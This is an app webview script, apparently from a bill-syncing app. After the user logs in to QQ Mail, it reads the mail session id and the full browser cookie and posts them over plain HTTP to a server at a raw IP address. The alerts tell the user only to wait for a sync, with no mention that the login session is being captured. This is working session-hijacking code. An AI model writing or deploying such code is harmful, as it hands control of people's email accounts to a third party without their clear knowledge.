console.log("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBB");
console.log(window.location.href);
//console.log(document.cookie);

var SQB_MEMBERID_KEY = 'SQB_MEMBERID_KEY';

function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    console.log("nihao:" + window.location.href.split("?")[1]);
    var r = window.location.href.split("?")[1].match(reg); //search,查询？后面的参数，并匹配正则
    if (r != null) return unescape(r[2]);
    return null;
}
//http://139.155.8.217/api/Member/GetInviteUserPhone?id=5
//获取用户ID
(function checkId() {
    let href = window.location.href;
    if (href.indexOf("http://139.155.8.217/api/Member/GetInviteUserPhone") != -1) {
        let memberId = getQueryString("id");
        plus.storage.setItem(SQB_MEMBERID_KEY, memberId);
        //window.location.href = 'https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml';
        window.location.href = 'https://mail.qq.com';
    }
})();



//上传登录信息到服务器
function qqmailIslogin() {
    let href = window.location.href;
    if (href.indexOf("https://w.mail.qq.com/cgi-bin/mobile") != -1) {
        return true;
    }
    return false;
};


function postServer(memberid, sid, cookie) {
    xhr = new plus.net.XMLHttpRequest();
    xhr.onerror = function(e) {
        var str = "lengthComputable=" + e.lengthComputable + "loaded=" + e.loaded + ";total=" + e.total;
        console.log("onerror: " + str);
    };
    xhr.onreadystatechange = function() {
        switch (xhr.readyState) {
            // case 0:alert("xhr请求已初始化");break;
            // case 1:alert("xhr请求已打开");break;
             case 2:alert("正在准备同步中,请勿离开此页面,约需一分钟左右");break;
            // case 3:alert("xhr请求已响应");break;
            case 4:
                if (xhr.status == 200) {
                    alert("请返回首页,点击更新账单");
                    var ws = plus.webview.currentWebview();
                    plus.webview.close(ws);
                } else {
                    alert("请求失败：" + xhr.readyState + "请截图给开发人员");
                }
                break;
            default:
                break;
        }
    };
    xhr.open("POST", "http://139.155.8.217/api/Sync/SyncAsync");
    var data = {
        MemberId: memberid,
        Mail: '',
        Sid: sid,
        Cookie: cookie
    };
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

function plusReady() {
    if (qqmailIslogin()) {
        let memberId = plus.storage.getItem(SQB_MEMBERID_KEY);
        let sid = getQueryString('sid');
        let cookie = document.cookie;
        console.log(`准备提交服务器:memeberid:${memberId},sid:${sid}, cookie:${cookie}`);
        console.log(`当前url:${window.location.href}`);
        postServer(memberId, sid, cookie);
    }
}

if (window.plus) {
    plusReady();
} else {
    document.addEventListener('plusready', plusReady, false);
}